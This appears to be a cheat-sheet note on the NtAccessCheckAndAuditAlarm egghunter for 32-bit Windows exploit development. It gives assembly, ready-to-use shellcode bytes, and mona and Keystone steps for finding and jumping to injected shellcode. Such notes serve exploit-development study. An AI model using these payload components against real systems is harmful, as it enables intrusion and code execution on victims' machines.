---
tags:
  - Advanced
  - Binary_Exploitation
  - Debugging
  - Egghunter
  - Exploitation
  - WinDbg
  - Windows
---

## NtAccessCheckAndAuditAlarm Egghunter
resources: [Skape Egghunter Paper](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf)

> System call-based egghunter using NtAccessCheckAndAuditAlarm to safely probe memory.

### How It Works [Knowledge]
> [!info] Uses **NtAccessCheckAndAuditAlarm** syscall to test memory accessibility:
> - Syscall returns **STATUS_ACCESS_VIOLATION** (0xc0000005) if address is invalid
> - This allows safe iteration through memory without crashing
> - When valid memory found, compare against egg tag

### NtAccessCheck Egghunter Assembly
> 32-byte egghunter implementation.

```nasm
loop_inc_page:
    or dx, 0x0fff           ; Align to page boundary (4095)
loop_inc_one:
    inc edx                 ; Increment address
    push edx                ; Save current address
    push 0x02               ; NtAccessCheckAndAuditAlarm syscall number
    pop eax                 ; EAX = 2
    int 0x2e                ; Call kernel
    cmp al, 0x05            ; Check for 0xc0000005 (ACCESS_VIOLATION)
    pop edx                 ; Restore address
    je loop_inc_page        ; If invalid, skip to next page
    mov eax, 0x74303077     ; EAX = egg tag ("w00t")
    mov edi, edx            ; EDI = current address
    scasd                   ; Compare [EDI] with EAX, increment EDI
    jnz loop_inc_one        ; If not equal, continue search
    scasd                   ; Compare again (egg is repeated)
    jnz loop_inc_one        ; If not equal, continue search
    jmp edi                 ; Jump to shellcode (after egg)
```

### Generate with Mona
> Create egghunter in **Immunity Debugger** using **mona.py**.

```text
!mona egg -t w00t
```

### Egghunter Shellcode (Python)
> Ready-to-use egghunter bytes.

```python
# NtAccessCheckAndAuditAlarm egghunter
# Egg: w00t (0x74303077)
egghunter = (
    b"\x66\x81\xca\xff\x0f"     # or dx, 0x0fff
    b"\x42"                     # inc edx
    b"\x52"                     # push edx
    b"\x6a\x02"                 # push 0x02
    b"\x58"                     # pop eax
    b"\xcd\x2e"                 # int 0x2e
    b"\x3c\x05"                 # cmp al, 0x05
    b"\x5a"                     # pop edx
    b"\x74\xef"                 # je loop_inc_page
    b"\xb8\x77\x30\x30\x74"     # mov eax, 0x74303077 (w00t)
    b"\x8b\xfa"                 # mov edi, edx
    b"\xaf"                     # scasd
    b"\x75\xea"                 # jnz loop_inc_one
    b"\xaf"                     # scasd
    b"\x75\xe7"                 # jnz loop_inc_one
    b"\xff\xe7"                 # jmp edi
)
```

### Change Egg Tag
> Modify the egg value in the egghunter.

```python
import struct

egg = b"HACK"   # Your custom egg
egg_value = struct.unpack("<I", egg)[0]  # Convert to little-endian dword

# Replace bytes 18-21 in egghunter with new egg value
egghunter = egghunter[:18] + struct.pack("<I", egg_value) + egghunter[22:]
```

### Prepend Egg to Shellcode
> Prepare the full payload with egg marker.

```python
egg = b"w00t"
shellcode = b""  # Your msfvenom shellcode

# Full payload to be placed in memory
full_payload = egg + egg + shellcode
```

### Using with Keystone Engine
> Assemble egghunter dynamically.

```python
from keystone import *

ks = Ks(KS_ARCH_X86, KS_MODE_32)

code = """
    loop_inc_page:
        or dx, 0x0fff
    loop_inc_one:
        inc edx
        push edx
        push 0x02
        pop eax
        int 0x2e
        cmp al, 0x05
        pop edx
        je loop_inc_page
        mov eax, 0x74303077
        mov edi, edx
        scasd
        jnz loop_inc_one
        scasd
        jnz loop_inc_one
        jmp edi
"""

encoding, count = ks.asm(code)
egghunter = bytes(encoding)
```

### Syscall Number Issue [Knowledge]
> [!warning] The syscall number (0x02) may vary between Windows versions:
> - **Windows XP/2003**: NtAccessCheckAndAuditAlarm = 0x02
> - **Windows 7+**: Syscall numbers changed significantly
> - For portability, consider SEH-based egghunter instead

### Testing Egghunter
> Verify egghunter finds the egg.

```text
1. Set breakpoint at egghunter start
2. Place egg+shellcode somewhere in memory
3. Step through egghunter
4. Verify it finds egg and jumps to shellcode
```

